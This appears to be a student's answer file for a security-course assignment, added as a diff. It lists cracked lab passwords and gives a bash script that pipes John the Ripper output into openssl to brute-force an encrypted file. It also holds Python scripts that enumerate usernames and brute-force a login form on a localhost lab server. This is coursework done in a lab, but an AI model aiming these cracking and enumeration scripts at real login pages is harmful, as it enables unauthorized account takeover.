@@ -1,0 +1,273 @@
+Assignment 1 Answers
+====================
+
+Part A
+------
+easyuser1:jesse
+easyuser2:daedalus
+easyuser3:omega
+easyuser4:allstate
+easyuser5:joyce
+
+mediumuser1:american12
+mediumuser2:juliejulie
+mediumuser3:simamora
+mediumuser4:jadey1
+mediumuser5:jai123
+
+harduser1:triggers
+harduser2
+harduser3:5300block
+harduser4:1kimjane
+harduser5:nabisco0
+
+Part B
+------
+1.
+#!/usr/bin/env bash
+#
+# The filename for this script is 'part_b.sh'.
+#
+# This script takes candidate passwords from stdin through a Unix pipe from john.
+# An attempt is made to decrypt the file with each candidate password. Then, since
+# the exit code of openssl may or may not indicate the decryption attempt was
+# successful, the 'file' utility is then used to check if the file was truly
+# decrypted successfully.
+#
+# Only if the 'file' utility outputs that the decrypted file is ASCII (but not
+# non-ISO extended ASCII) or Unicode, then the script prints the contents of
+# the decrypted file and terminates with success.
+#
+# This script must be run in the same directory as secret_file.aes256.txt.
+# Usage:
+# $ /path/to/john --wordlist=<wordlist> --rules --stdout | ./part_b.sh
+
+while read password; do
+        echo "$password"
+        cat secret_file.aes256.txt | base64 --decode | openssl enc -aes256 -md md5 -d -k "$(echo -n "$password" | md5sum | awk '{print $1}')" > part_b_cracked.txt
+        rc=$?
+
+        if [ $rc -eq 0 ]; then
+                file_info="$(file --brief part_b_cracked.txt)"
+
+                if [ "$file_info" == "data" ]; then
+                        echo 'File decrypted to garbage binary data'
+                elif [[ "$file_info" == "Sendmail"* ]]; then
+                        echo 'File decrypted to garbage send mail'
+                elif [[ "$file_info" == *"with escape sequences"* ]]; then
+                        echo 'File contains escape sequences'
+                elif [[ "$file_info" == *"Non-ISO extended-ASCII text"* ]]; then
+                        echo 'File has non-ISO extended ASCII'
+                elif [[ "$file_info" == *"executable"* ]]; then
+                        echo 'File is in some executable format'
+                elif [[ "$file_info" == *"ASCII"* ]] || [[ "$file_info" == *"Unicode"* ]]; then
+                        echo "File has type: $file_info"
+                        echo 'Successfully cracked the file. Decrypted contents:'
+                        cat part_b_cracked.txt
+                        exit 0
+                fi
+        fi
+done
+
+echo 'Failed to find password that worked'
+
+exit 1
+
+2.
+~/JohnTheRipper-unstable-jumbo/run/john --wordlist=/home/student/over-million.lst --rules --stdout | ./part_b.sh
+
+3.
+Modi porro non magnam neque quiquia.
+
+Part C
+------
+1.
+#!/usr/bin/env python3
+#
+# This script uses the first 100k facebook names from the
+# facebook dump to find available passwords.
+#
+# This script uses BeautifulSoup, a python HTML parser, to
+# get information from the HTML returned by the POST request.
+# For each username, a POST request is made to the server.
+# The response HTML is then parsed and the text of the alert
+# is captured. If the text does not contain the string
+# 'Username does not exist', if an exception occurred, or if
+# the alert HTML element was not present, then the username
+# is considered to possibly be active.
+#
+# After checking all 100k names, the possibly valid names are
+# all printed, and the script terminates. The hacker can then
+# proceed to manually check which of the output names are
+# valid.
+#
+# The reason this script considers usernames to only possibly
+# be valid is because it was written prior to knowing exactly
+# what alert text would indicate the user was valid.
+
+import requests
+from bs4 import BeautifulSoup
+
+with open('facebook-firstnames-first-100k.txt') as f:
+    usernames = [line.rstrip() for line in f]
+
+url = 'http://localhost:5000/login'
+print(f'Making POST requests to {url}')
+
+possibly_worked = []
+
+for username in usernames:
+    data = {
+        'username': username,
+        'password': 'probablynotarealpassword'
+    }
+
+    res = requests.post(url, data=data)
+
+    if res.status_code > 299:
+        print(f'Received non-2XX status code: {res.status_code}')
+        print('This may or may not mean success')
+        possibly_worked.append(username)
+        continue
+
+    soup = BeautifulSoup(res.text, 'html.parser')
+    alerts = soup.findAll('div', {'class': 'alert alert-info'})
+
+    if len(alerts) < 1:
+        print('The alert for incorrect username not found')
+        print('This may or may not mean success')
+        possibly_worked.append(username)
+        continue
+
+    alert = alerts[0]
+
+    try:
+        alert_text = alert.contents[2].strip().lower()
+    except Exception as e:
+        print('An exception occurred:')
+        print(e)
+        print('This may or may not mean success')
+        possibly_worked.append(username)
+        continue
+
+    if 'username does not exist' not in alert_text:
+        print('The alert exists but is not an alert about the username not existing')
+        print('This may or may not mean success')
+        possibly_worked.append(username)
+    else:
+        print(f'Username "{username}" not present.')
+
+if len(possibly_worked) < 1:
+    print('No possibly working usernames found.')
+    exit(1)
+
+print()
+print()
+print('The following usernames might work:')
+for username in possibly_worked:
+    print(username)
+
+print('\nExiting.')
+exit(0)
+
+2.
+#!/usr/bin/env python
+#
+# **This script must be run with PYTHON2, *NOT* python3**
+#
+# This script loops over passwords piped to the program on
+# stdin until the alert either does not contain the text
+# 'invalid password', the alert is not present, or an
+# exception occurs processing the alert HTML element.
+# When one of these events occurs, the password that
+# causes this event is printed, and the script terminates.
+#
+# The script was written in this way because it is
+# hard to automate checking for successful login without
+# knowing what the HTTP POST response will look like
+# in the case of a successful login.
+#
+# Usage (must use python 2):
+# $ john --wordlist=<path to wordlist> --rules --stdout | python find_password.py
+
+from __future__ import print_function
+# python 2 specific
+from future_builtins import map
+
+import sys
+import requests
+from bs4 import BeautifulSoup
+
+username = 'michael'
+
+url = 'http://localhost:5000/login'
+print('Making POST requests to {}.'.format(url))
+
+passwords_tried = 0
+
+for password in map(str.rstrip, sys.stdin):
+    data = {
+        'username': username,
+        'password': password
+    }
+
+    res = requests.post(url, data=data)
+
+    if res.status_code >= 400:
+        print('Error: Received error status code: {}'.format(res.status_code))
+        exit(1)
+
+    soup = BeautifulSoup(res.text, 'html.parser')
+    alerts = soup.findAll('div', {'class': 'alert alert-info'})
+
+    if len(alerts) < 1:
+        print('The alert for invalid password not found')
+        print(password)
+        print('This happened with "{}" as the password'.format(password))
+        exit(0)
+
+    alert = alerts[0]
+
+    try:
+        alert_text = alert.contents[2].strip().lower()
+    except Exception as e:
+        print('An exception occurred:')
+        print(e)
+        print('This may or may not mean success')
+        print(password)
+        print('This happened with "{}" as the password'.format(password))
+        exit(0)
+
+    if 'invalid password' not in alert_text:
+        print('The alert exists but is not an alert about an invalid password')
+        print('This may or may not mean success')
+        print(password)
+        print('This happened with "{}" as the password'.format(password))
+        exit(0)
+
+    passwords_tried += 1
+    if passwords_tried % 1000 == 0:
+        print('{} passwords tried so far.'.format(passwords_tried))
+
+print(passwords_tried)
+print('\nFailed: Finished processing all candidate passwords with no success.')
+exit(1)
+
+3. michael
+
+4. 123456789
+
+5.
+My process for finding an active user and cracking an account is described in more detail in the
+comments for my two scripts.
+
+Since I knew the page displays a 'Username does not exist' message when an invalid username is entered,
+and I knew this was also the case for the HTML response given on an HTTP POST request, I knew I could use
+the BeautifulSoup HTML parser python library to extract this message. If I got a different message,
+then the username that I got the new message with was possibly a valid username. After the script was done,
+I manually confirmed 'michael' was an active username.
+
+Next I used my second script to crack the account. I piped candidate passwords from john simiarly to
+how I did in part B of this assignment. When I didn't get an 'Invalid password' message (again using
+BeautifulSoup), the script printed that password as a possibly valid password for the 'michael' user.
+I then manually verified that I could login as the 'michael' user.
